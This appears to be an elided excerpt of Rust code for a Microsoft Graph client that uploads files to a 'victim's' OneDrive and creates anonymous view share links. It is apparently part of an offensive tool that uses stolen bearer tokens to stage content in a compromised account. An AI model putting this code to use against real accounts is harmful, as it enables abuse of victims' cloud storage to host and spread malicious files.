...
impl GraphClient {
    ...
    /// Upload file bytes to victim's OneDrive root and return the DriveItem.
    pub async fn upload_to_onedrive(
        ...
        let url = self.url(&format!("/v1.0/me/drive/root:/{}:/content", encoded));
        let req = self
            .client
            .put(&url)
            .header("Authorization", format!("Bearer {}", token))
        ...
        let res = self.send_with_retry(req).await?;
        if res.status().is_success() {
            res.json::<DriveItem>().await.context("parse drive item failed")
        } else {
            let body_text = res.text().await.unwrap_or_default();
            anyhow::bail!("OneDrive upload failed: {}", body_text)
        }
    }

    /// Create an anonymous view share link for a drive item.
    pub async fn create_share_link(
        ...
        let res = self.send_with_retry(req).await?;
        if res.status().is_success() {
            res.json::<ShareLink>().await.context("parse share link failed")
        } else {
            let body_text = res.text().await.unwrap_or_default();
            anyhow::bail!("Create share link failed: {}", body_text)
        }
    }
}
